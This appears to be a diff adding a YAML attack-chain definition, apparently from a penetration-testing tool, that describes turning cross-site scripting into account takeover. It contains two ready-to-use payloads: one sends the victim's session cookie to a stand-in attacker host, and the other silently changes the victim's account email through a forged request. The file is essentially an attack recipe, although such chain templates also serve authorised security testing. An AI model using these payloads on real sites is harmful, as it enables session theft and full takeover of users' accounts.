@@ -1,0 +1,18 @@
+id: xss_to_ato
+name: XSS to Account Takeover Chain
+impact: critical
+prerequisites:
+  - stored_xss or reflected_xss
+  - session cookies without HttpOnly flag OR CSRF on email/password change
+chain:
+  - step: 1
+    finding: xss
+    description: "Find XSS (stored preferred, reflected works with social engineering)"
+  - step: 2
+    action: "Craft payload to steal session cookie or trigger CSRF"
+    payloads:
+      cookie_steal: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
+      csrf_email: '<script>fetch("/api/change-email",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"attacker@evil.com"}),credentials:"include"})</script>'
+  - step: 3
+    result: "Attacker receives victim session or changes victim email"
+    impact: "Full account takeover"
